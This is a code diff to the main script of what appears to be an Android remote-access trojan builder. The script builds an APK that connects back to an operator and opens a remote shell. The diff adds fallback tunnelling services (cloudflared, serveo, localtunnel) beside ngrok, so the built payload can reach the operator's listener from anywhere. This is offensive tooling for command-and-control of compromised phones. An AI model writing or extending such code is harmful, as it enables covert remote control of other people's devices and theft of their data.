@@ -5,12 +5,16 @@ from utils import *
 import argparse
 import sys
 import platform
+from tunneling import create_tunnel_with_alternatives
+
+# Try to import pyngrok but don't fail if not available
 try:
-    from pyngrok import ngrok,conf
-except ImportError as e:
-    print(stdOutput("error")+"\033[1mpyngrok not found");
-    print(stdOutput("info")+"\033[1mRun pip3 install -r requirements.txt")
-    exit()
+    from pyngrok import ngrok, conf
+    NGROK_AVAILABLE = True
+except ImportError:
+    NGROK_AVAILABLE = False
+    print(stdOutput("warning")+"\033[1mpyngrok not available - will use alternative tunneling services")
+    print(stdOutput("info")+"\033[1mTo use ngrok: pip3 install pyngrok")
     
 clearDirec()
 
@@ -26,7 +30,10 @@ clearDirec()
 parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
 parser.add_argument('--build',help='For Building the apk',action='store_true')
 parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
-parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
+parser.add_argument('--ngrok',help='For using ngrok tunneling (requires credit card for TCP)',action='store_true')
+parser.add_argument('--tunnel',help='Auto-select best available tunneling service',action='store_true')
+parser.add_argument('--tunnel-service',metavar="<service>", type=str, choices=['ngrok','cloudflared','serveo','localtunnel','auto'], 
+                    default='auto', help='Choose tunneling service: ngrok, cloudflared, serveo, localtunnel, auto')
 parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
 parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
 parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
@@ -45,20 +52,46 @@ if sys.version_info < (3, 6):
 if args.build:
     port_ = args.port
     icon=True if args.icon else None
-    if args.ngrok:
-        conf.get_default().monitor_thread = False
-        port = 8000 if not port_ else port_
-        tcp_tunnel = ngrok.connect(port, "tcp")
-        ngrok_process = ngrok.get_ngrok_process()
-        domain,port = tcp_tunnel.public_url[6:].split(":")
-        ip = socket.gethostbyname(domain)
-        print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
-        build(ip,port,args.output,True,port_,icon)
+    
+    # Handle tunneling options
+    if args.ngrok or args.tunnel:
+        port = 8000 if not port_ else int(port_)
+        
+        # Determine which tunneling service to use
+        if args.ngrok and NGROK_AVAILABLE:
+            service = "ngrok"
+        elif args.tunnel:
+            service = args.tunnel_service
+        else:
+            service = "auto"
+            
+        print(stdOutput("info")+"\033[1mSetting up tunnel...")
+        
+        # Use new tunneling system
+        tunnel_manager, tunnel_result = create_tunnel_with_alternatives(port, service)
+        
+        if tunnel_result:
+            ip, tunnel_port, tunnel_url = tunnel_result
+            print(stdOutput("success")+"\033[1mTunnel established successfully!")
+            build(ip, tunnel_port, args.output, True, port_, icon)
+            
+            # Keep tunnel alive during shell if requested
+            if tunnel_manager:
+                try:
+                    get_shell("0.0.0.0", port)
+                finally:
+                    tunnel_manager.close_tunnel()
+        else:
+            print(stdOutput("error")+"\033[1mFailed to establish tunnel")
+            print(stdOutput("info")+"\033[1mTry using --tunnel-service to specify a different service")
+            print(stdOutput("info")+"\033[1mAvailable services: cloudflared, serveo, localtunnel, ngrok")
+            sys.exit()
     else:
         if args.ip and args.port:
             build(args.ip,port_,args.output,False,None,icon)
         else:
             print(stdOutput("error")+"\033[1mArguments Missing")
+            print(stdOutput("info")+"\033[1mUse --tunnel for automatic tunneling, or provide -i and -p")
 
 if args.shell:
     if args.ip and args.port:
